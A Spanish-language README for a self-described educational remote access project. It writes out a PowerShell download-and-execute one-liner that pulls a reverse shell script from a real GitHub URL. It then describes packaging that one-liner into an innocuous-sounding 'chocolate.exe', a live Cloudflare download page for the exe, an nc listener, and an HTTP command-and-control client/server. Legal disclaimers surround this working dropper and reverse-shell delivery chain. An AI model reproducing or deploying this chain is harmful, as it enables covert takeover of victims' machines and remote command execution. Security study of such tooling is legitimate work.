# Remote Code Execution Educational Project
⚠️ **ADVERTENCIA CRÍTICA: PROYECTO SOLO PARA FINES EDUCATIVOS**

⚠️🚨 **NO EJECUTAR EL EXE DE PRUEBA (chocolate.exe)**⚠️🚨
---

## Descripción del Proyecto
Este repositorio contiene código educativo diseñado exclusivamente para comprender el funcionamiento de los RAT (Remote Administration Tools) y técnicas de ejecución remota de código. El objetivo es proporcionar material de estudio para profesionales de ciberseguridad, investigadores y estudiantes en entornos controlados.


🚨 **USO RESPONSABLE REQUERIDO**

- Solo ejecutar en laboratorios aislados  
- Nunca utilizar contra sistemas sin autorización explícita  
- Comprender las implicaciones legales antes de proceder

---

## Estructura del Proyecto

### Paso 1: Ejecución Remota mediante PowerShell Ofuscado
El proyecto implementa una técnica común de ofuscación usando Base64 para ejecutar código PowerShell remotamente.

**Comando Original:**
```powershell
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/akthanon/cybersecurity-tools/refs/heads/main/shell.ps1')"
```

```python
import os

# Comando PowerShell ofuscado en Base64 con osfuscarshell.py

chocolate.py
```

---

### Paso 2: Compilación a Ejecutable
Compilación del script Python a archivo ejecutable:

```
chocolate.exe
```

```bash
pyinstaller --onefile .\chocolate.py
```

### Descarga del .exe

Para facilitar la descarga del archivo se creó una pagina llamada descarga.html que tiene un botón para descargar el archivo chocolate.exe

la pagina también está hosteada en clouflare

https://chocolate.jorpavelazc-93f.workers.dev/descarga

---

### Shell PowerShell (`shell.ps1`)
Código para establecer conexión reversa:

```
shell.ps1
```

---

### Configuración del Listener
En la máquina atacante (solo para pruebas educativas):

```bash
nc -lvnp 4444
```

---

### Payload Divertido de Ejemplo 
```
$url = "https://www.adslzone.net/app/uploads-adslzone.net/2017/01/hacked.jpg"; $output = "imagen.jpg"; Write-Host "Descargando imagen desde $url..."; Invoke-WebRequest -Uri $url -OutFile $output; if (Test-Path $output) { Write-Host "Imagen descargada correctamente."; Start-Process $output } else { Write-Host "Error: No se pudo descargar la imagen." }; $video = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; Write-Host "Abriendo video de YouTube..."; Start-Process $video
```
## Nuevos añadidos cliente.py comando.py y servidor.py se han añadido como un extra
Se cambió el chocolate.exe por la compilacion del cliente.py
# HTTP WebShell (PoC)

Una **WebShell por HTTP** escrita en Python como prueba de concepto (PoC) para comprender cómo un cliente remoto puede recibir comandos desde un servidor web, ejecutarlos y devolver la salida utilizando peticiones HTTP.

## Componentes

* **cliente.py**: Agente que consulta periódicamente al servidor, ejecuta comandos y envía la salida.
* **servidor.py**: Servidor HTTP sencillo que actúa como intermediario entre el operador y el cliente.
* **comando.py**: Consola interactiva para enviar comandos y visualizar los resultados.

## Flujo

```text
comando.py
      │
 POST /send
      │
      ▼
servidor.py
      │
 GET /messages
      │
      ▼
cliente.py
      │
 Ejecuta comando
      │
 POST /shell
      │
      ▼
servidor.py
      │
GET /shell_messages
      │
      ▼
comando.py
```

## Objetivo

Este proyecto tiene fines **educativos** y está diseñado para comprender conceptos básicos de comunicación cliente-servidor, ejecución remota de comandos mediante HTTP y arquitectura de un sistema simple de control remoto en entornos de laboratorio autorizados.

---

## 🔒 Advertencias de Seguridad

⚠️ **DECLARACIÓN LEGAL IMPORTANTE**

- **USO ÉTICO OBLIGATORIO:** Este código debe usarse solo con fines educativos.  
- **AUTORIZACIÓN REQUERIDA:** Nunca ejecutar en sistemas sin permiso explícito.  
- **RESPONSABILIDAD DEL USUARIO:** El mal uso de este material es responsabilidad exclusiva del usuario.  
- **CONSECUENCIAS LEGALES:** El uso no autorizado puede violar leyes locales e internacionales.

---

## Configuración Segura Recomendada
- Ejecutar en máquinas virtuales aisladas  
- Usar redes de laboratorio separadas  
- Desactivar conexión a internet durante pruebas  
- Monitorear con herramientas de seguridad

---

## Objetivos Educativos
- Comprender técnicas de ofuscación de código  
- Analizar mecanismos de ejecución remota  
- Estudiar patrones de comportamiento de RAT  
- Desarrollar contramedidas de detección

---

## Contribuciones
Se aceptan contribuciones que mejoren el valor educativo o añadan análisis de detección y prevención.

---

⚠️ **RECUERDA:** El conocimiento es poder, pero la responsabilidad es esencial. Usa este material sabiamente.
